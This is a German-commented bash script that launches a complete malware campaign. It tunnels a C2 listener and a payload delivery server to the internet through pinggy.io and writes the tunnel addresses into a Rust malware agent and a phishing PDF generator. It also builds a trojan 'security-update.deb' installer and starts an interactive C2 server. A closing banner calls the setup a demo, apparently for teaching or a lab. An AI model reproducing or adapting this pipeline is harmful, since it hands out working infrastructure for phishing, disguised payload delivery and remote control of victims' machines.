#!/bin/bash

# ==========================================
#  MASTER STARTUP SCRIPT (Interactive C2)
# ==========================================

# set -e  <-- WICHTIG: Auskommentiert lassen!

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(dirname "$SCRIPT_DIR")"

# Dateien & Pfade
MAIN_RS="$ROOT_DIR/malware_agent/src/main.rs"
PDF_SCRIPT="$ROOT_DIR/delivery/pdf_phishing/generate_phishing_pdf.py"

# Temp Files für Logs
PINGGY_TCP_LOG="/tmp/pinggy_tcp_$$.log"
PINGGY_HTTP_LOG="/tmp/pinggy_http_$$.log"
PIDS_FILE="/tmp/rust_mw_pids_$$"

# SSH Key für Automation
AUTO_KEY="$HOME/.ssh/pinggy_auto_key"

print_banner() {
  echo -e "${CYAN}"
  echo "╔════════════════════════════════════════════════════════════╗"
  echo "║           RUST-MW AUTOMATED STARTUP SYSTEM                 ║"
  echo "╚════════════════════════════════════════════════════════════╝"
  echo -e "${NC}"
}

print_status() { echo -e "${BLUE}[*] $1${NC}"; }
print_success() { echo -e "${GREEN}[+] $1${NC}"; }
print_error() { echo -e "${RED}[!] $1${NC}"; }
print_warning() { echo -e "${YELLOW}[!] $1${NC}"; }

# --- CLEANUP & TRAP ---
save_pid() { echo "$1" >>"$PIDS_FILE"; }

cleanup() {
  echo ""
  print_warning "Beende Session..."
  if [ -f "$PIDS_FILE" ]; then
    while read pid; do
      if kill -0 "$pid" 2>/dev/null; then
        kill "$pid" 2>/dev/null || true
      fi
    done <"$PIDS_FILE"
    rm -f "$PIDS_FILE"
  fi
  rm -f "$PINGGY_TCP_LOG" "$PINGGY_HTTP_LOG"
  print_success "Alles beendet. Bye!"
  exit 0
}
trap cleanup SIGINT SIGTERM

# --- HELPER: KEY SETUP ---
setup_ssh_key() {
  if [ ! -f "$AUTO_KEY" ]; then
    print_status "Erstelle SSH-Key für Pinggy..."
    ssh-keygen -t ed25519 -f "$AUTO_KEY" -N "" -q
  fi
}

# ==========================================
#  STEP 1: C2 TUNNEL (TCP)
# ==========================================
start_pinggy_c2() {
  print_status "Starte C2 Tunnel (TCP 4444)..."
  touch "$PINGGY_TCP_LOG"

  ssh -o StrictHostKeyChecking=no \
    -o ServerAliveInterval=60 \
    -o IdentitiesOnly=yes \
    -o PubkeyAuthentication=yes \
    -T \
    -i "$AUTO_KEY" \
    -p 443 \
    -R0:localhost:4444 \
    tcp@a.pinggy.io >"$PINGGY_TCP_LOG" 2>&1 &

  save_pid $!

  print_status "Warte auf C2 URL..."
  local timeout=30
  local elapsed=0

  while [ $elapsed -lt $timeout ]; do
    if [ -s "$PINGGY_TCP_LOG" ]; then
      C2_URL=$(grep -a -oE 'tcp://[a-zA-Z0-9.-]+:[0-9]+' "$PINGGY_TCP_LOG" | head -1 || true)
      if [ -n "$C2_URL" ]; then break; fi
    fi
    sleep 1
    ((elapsed++))
    echo -ne "\r${BLUE}[*] Warte... ${elapsed}s${NC}"
  done
  echo ""

  if [ -z "$C2_URL" ]; then
    print_error "C2 Tunnel fehlgeschlagen. Log:"
    cat "$PINGGY_TCP_LOG"
    exit 1
  fi

  # Parsing
  PINGGY_HOST=$(echo "$C2_URL" | sed 's|tcp://||' | cut -d':' -f1)
  PINGGY_PORT=$(echo "$C2_URL" | sed 's|tcp://||' | cut -d':' -f2)
  print_success "C2 Tunnel: $C2_URL"
}

# ==========================================
#  STEP 2: DELIVERY TUNNEL (HTTP)
# ==========================================
start_pinggy_delivery() {
  print_status "Starte Delivery Tunnel (HTTP 3000)..."
  touch "$PINGGY_HTTP_LOG"

  # HIER KEIN 'tcp@', da wir HTTP wollen
  ssh -o StrictHostKeyChecking=no \
    -o ServerAliveInterval=60 \
    -o IdentitiesOnly=yes \
    -o PubkeyAuthentication=yes \
    -T \
    -i "$AUTO_KEY" \
    -p 443 \
    -R0:localhost:3000 \
    a.pinggy.io >"$PINGGY_HTTP_LOG" 2>&1 &

  save_pid $!

  print_status "Warte auf Delivery URL..."
  local timeout=30
  local elapsed=0

  while [ $elapsed -lt $timeout ]; do
    if [ -s "$PINGGY_HTTP_LOG" ]; then
      # Suche nach https://...
      DELIVERY_URL=$(grep -a -oE 'https://[a-zA-Z0-9.-]+\.pinggy\.link' "$PINGGY_HTTP_LOG" | head -1 || true)
      # Fallback für pinggy.io domains
      if [ -z "$DELIVERY_URL" ]; then
        DELIVERY_URL=$(grep -a -oE 'https://[a-zA-Z0-9.-]+\.pinggy\.io' "$PINGGY_HTTP_LOG" | head -1 || true)
      fi

      if [ -n "$DELIVERY_URL" ]; then break; fi
    fi
    sleep 1
    ((elapsed++))
    echo -ne "\r${BLUE}[*] Warte... ${elapsed}s${NC}"
  done
  echo ""

  if [ -z "$DELIVERY_URL" ]; then
    print_error "Delivery Tunnel fehlgeschlagen."
    exit 1
  fi

  # URL für den Smart-Endpoint ergänzen
  FULL_DELIVERY_URL="${DELIVERY_URL}/dokument_abrufen"
  print_success "Delivery Tunnel: $DELIVERY_URL"
}

# ==========================================
#  STEP 3: CONFIG UPDATES
# ==========================================
update_configs() {
  print_status "Aktualisiere Konfigurationen..."

  # 1. Rust Agent Config
  if [ -f "$MAIN_RS" ]; then
    sed -i "s|const C2_IP: &str = \"[^\"]*\";|const C2_IP: \&str = \"$PINGGY_HOST\";|" "$MAIN_RS"
    sed -i "s|const C2_PORT: u16 = [0-9]*;|const C2_PORT: u16 = $PINGGY_PORT;|" "$MAIN_RS"
    print_success "Rust C2 Config updated."
  else
    print_error "main.rs nicht gefunden!"
  fi

  # 2. PDF Generator Config
  if [ -f "$PDF_SCRIPT" ]; then
    # Sucht nach PAYLOAD_URL = "..." und ersetzt es
    sed -i "s|PAYLOAD_URL = \"[^\"]*\"|PAYLOAD_URL = \"$FULL_DELIVERY_URL\"|" "$PDF_SCRIPT"
    print_success "PDF Link updated: $FULL_DELIVERY_URL"
  else
    print_error "PDF Script nicht gefunden!"
  fi
}

# ==========================================
#  STEP 4: DELIVERY SERVER (Background)
# ==========================================
start_delivery_server() {
  print_status "Starte Delivery Webserver..."
  cd "$ROOT_DIR/delivery/DbD-Site"
  python3 server.py >/dev/null 2>&1 &
  save_pid $!
  cd "$ROOT_DIR"
  print_success "Delivery Server läuft im Hintergrund."
}

# ==========================================
#  STEP 5: BUILD & PACKAGING
# ==========================================
run_build() {
  print_status "Starte Build Prozess..."

  # 1. Normale Payloads bauen
  if [ -x "$SCRIPT_DIR/build_payloads.sh" ]; then
    "$SCRIPT_DIR/build_payloads.sh" >/dev/null
    print_success "Raw Payloads & PDF gebaut."
  else
    print_error "build_payloads.sh nicht gefunden."
  fi

  # 2. Linux .deb Installer bauen (NEU)
  if [ -x "$SCRIPT_DIR/build_linux_deb.sh" ]; then
    # Ausführbar machen, falls nicht schon geschehen
    chmod +x "$SCRIPT_DIR/build_linux_deb.sh"

    print_status "Baue Linux .deb Installer..."
    "$SCRIPT_DIR/build_linux_deb.sh" >/dev/null

    # Prüfen ob erfolgreich
    if [ -f "$ROOT_DIR/delivery/DbD-Site/files/security-update.deb" ]; then
      print_success ".deb Paket erfolgreich erstellt."
    else
      print_warning ".deb Paket wurde nicht erstellt (Script lief, aber kein Output)."
    fi
  else
    print_warning "build_linux_deb.sh nicht gefunden - Überspringe .deb Erstellung."
  fi
}

# ==========================================
#  MAIN LOOP
# ==========================================
main() {
  print_banner
  setup_ssh_key

  # 1. Infrastruktur hochfahren
  start_pinggy_c2
  start_pinggy_delivery

  # 2. Konfigurieren & Bauen (jetzt inklusive .deb)
  update_configs
  run_build

  # 3. Webserver starten
  start_delivery_server

  # 4. Zusammenfassung
  echo ""
  echo -e "${CYAN}╔══════════════════ READY FOR DEMO ══════════════════╗${NC}"
  echo -e " 1. Phishing PDF Link:  ${YELLOW}$FULL_DELIVERY_URL${NC}"
  echo -e " 2. Webseiten URL:      ${YELLOW}$DELIVERY_URL/game${NC}"
  echo -e " 3. C2 Verbindung:      ${YELLOW}$C2_URL${NC}"
  echo -e "${CYAN}╚════════════════════════════════════════════════════╝${NC}"
  echo ""
  echo -e "${GREEN}Starte jetzt den C2 Server im interaktiven Modus...${NC}"
  echo "Drücke Enter zum Starten (Ctrl+C zum Beenden der Demo)."
  read

  # 5. C2 SERVER IM VORDERGRUND (Interaktiv)
  cd "$ROOT_DIR/c2_server"
  python3 server.py

  # Wenn User C2 beendet, aufräumen
  cleanup
}

main "$@"
